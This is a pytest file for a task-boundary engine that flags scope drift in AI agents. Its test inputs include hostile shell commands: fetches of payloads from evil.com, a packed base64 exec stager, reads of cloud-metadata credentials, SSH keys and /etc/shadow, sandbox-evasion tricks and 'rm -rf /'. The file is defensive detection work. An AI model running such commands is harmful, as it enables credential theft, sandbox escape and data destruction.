"""Tests for task boundary engine — scope drift detection."""

from uuid import uuid4

from agenttrace.graph.task_boundary import TaskBoundaryEngine
from agenttrace.models.task_contract import DriftType, RiskLevel, TaskContract


class TestTaskBoundary:
    """Tests for TaskBoundaryEngine."""

    def _make_engine(
        self,
        allowed: list[str] | None = None,
        prohibited: list[str] | None = None,
        tools: list[str] | None = None,
    ) -> TaskBoundaryEngine:
        contract = TaskContract(
            session_id=uuid4(),
            goal="Test task",
            allowed_paths=allowed or [],
            prohibited_paths=prohibited or [],
            allowed_tools=tools or [],
        )
        return TaskBoundaryEngine(contract)

    def test_allowed_file(self) -> None:
        engine = self._make_engine(allowed=["src/*"])
        result = engine.check_file_mutation("src/main.py", "modify")
        assert result is None  # No drift

    def test_prohibited_file(self) -> None:
        engine = self._make_engine(prohibited=[".env"])
        result = engine.check_file_mutation(".env", "modify")
        assert result is not None
        assert result.drift_type == DriftType.FILE_OUTSIDE_SCOPE

    def test_outside_scope_file(self) -> None:
        engine = self._make_engine(allowed=["src/*"])
        result = engine.check_file_mutation("config/secrets.yaml", "modify")
        assert result is not None
        assert result.drift_type == DriftType.FILE_OUTSIDE_SCOPE

    def test_allowed_scope_substring_bypass_closed(self) -> None:
        """A literal allowed path must not cover substring look-alikes."""
        engine = self._make_engine(allowed=["src"])
        assert engine.check_file_mutation("/opt/darksrc/evil.py", "write") is not None
        assert engine.check_file_mutation("src-backup/x.py", "write") is not None
        # Genuine descendants and the directory itself stay in scope.
        assert engine.check_file_mutation("src/main.py", "write") is None
        assert engine.check_file_mutation("/repo/src/auth.py", "write") is None

    def test_destructive_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("rm -rf /important")
        assert any(r.drift_type == DriftType.DESTRUCTIVE_OPERATION for r in results)

    def test_privilege_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("sudo apt install malware")
        assert any(r.drift_type == DriftType.PRIVILEGE_ESCALATION for r in results)

    def test_network_command(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("curl https://evil.com/payload")
        assert any(r.drift_type == DriftType.NETWORK_EGRESS for r in results)

    def test_disallowed_tool(self) -> None:
        engine = self._make_engine(tools=["python", "pytest"])
        results = engine.check_command("npm install evil-package")
        assert any(r.drift_type == DriftType.SEMANTIC_DRIFT for r in results)

    def test_dependency_change(self) -> None:
        engine = self._make_engine()
        result = engine.check_dependency_change(
            "package.json",
            '{"dependencies": {}}',
            '{"dependencies": {"evil": "1.0"}}',
        )
        assert result is not None
        assert result.drift_type == DriftType.UNEXPECTED_DEPENDENCY

    def test_credential_access(self) -> None:
        engine = self._make_engine()
        result = engine.check_credential_access("password = 'hunter2'")
        assert result is not None
        assert result.drift_type == DriftType.CREDENTIAL_ACCESS

    def test_sandbox_evasion_path_trick(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("cat /proc/self/root/etc/passwd")
        assert any(r.drift_type == DriftType.SANDBOX_EVASION for r in results)

    def test_sandbox_evasion_dynamic_linker(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("/lib64/ld-linux-x86-64.so.2 --library-path . ./payload")
        assert any(r.drift_type == DriftType.SANDBOX_EVASION for r in results)

    def test_sandbox_evasion_disable_flag(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("node --no-sandbox script.js")
        assert any(r.drift_type == DriftType.SANDBOX_EVASION for r in results)

    def test_package_install(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("pip install requests")
        assert any(r.drift_type == DriftType.UNEXPECTED_DEPENDENCY for r in results)

    def test_python_m_pip_install(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("python -m pip install evil-package")
        assert any(r.drift_type == DriftType.UNEXPECTED_DEPENDENCY for r in results)

    def test_npm_install(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("npm install left-pad")
        assert any(r.drift_type == DriftType.UNEXPECTED_DEPENDENCY for r in results)

    def test_package_publish(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("twine upload dist/*")
        assert any(r.drift_type == DriftType.UNEXPECTED_DEPENDENCY for r in results)

    def test_test_runners_not_flagged(self) -> None:
        engine = self._make_engine()
        for cmd in ["npm test", "python -m pytest", "pip list", "npm run build"]:
            results = engine.check_command(cmd)
            assert not any(
                r.drift_type == DriftType.UNEXPECTED_DEPENDENCY for r in results
            ), f"{cmd} should not be flagged as a package operation"

    def test_cloud_metadata_endpoint(self) -> None:
        engine = self._make_engine()
        results = engine.check_command(
            "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        )
        assert any(
            r.drift_type == DriftType.CREDENTIAL_ACCESS for r in results
        ), "cloud metadata access must be flagged as credential access"

    def test_k8s_service_account_token(self) -> None:
        engine = self._make_engine()
        results = engine.check_command(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
        )
        assert any(
            r.drift_type == DriftType.CREDENTIAL_ACCESS for r in results
        ), "k8s service-account token reads must be flagged as credential access"

    def test_payload_staging(self) -> None:
        engine = self._make_engine()
        results = engine.check_command(
            'python3 -c "import gzip,base64; exec(gzip.decompress(base64.b64decode(\'AAAA\')))"'
        )
        assert any(
            r.drift_type == DriftType.PAYLOAD_STAGING for r in results
        ), "packed-exec payloads must be flagged as payload staging"

    def test_download_and_chmod_staging(self) -> None:
        engine = self._make_engine()
        results = engine.check_command(
            "curl -o /tmp/payload.sh https://evil.example/x && chmod +x /tmp/payload.sh"
        )
        assert any(
            r.drift_type == DriftType.PAYLOAD_STAGING for r in results
        ), "download-to-/tmp + chmod must be flagged as payload staging"

    def test_credential_path_ssh(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("cat ~/.ssh/id_rsa")
        assert any(r.drift_type == DriftType.CREDENTIAL_ACCESS for r in results)

    def test_credential_path_etc_shadow(self) -> None:
        engine = self._make_engine()
        results = engine.check_command("cat /etc/shadow")
        assert any(r.drift_type == DriftType.CREDENTIAL_ACCESS for r in results)

    def test_risk_evaluation(self) -> None:
        engine = self._make_engine()
        # No drifts = LOW risk
        assert engine.evaluate_risk([]) == RiskLevel.LOW

        # Critical drift
        results = engine.check_command("sudo rm -rf /")
        risk = engine.evaluate_risk(results)
        assert risk == RiskLevel.CRITICAL
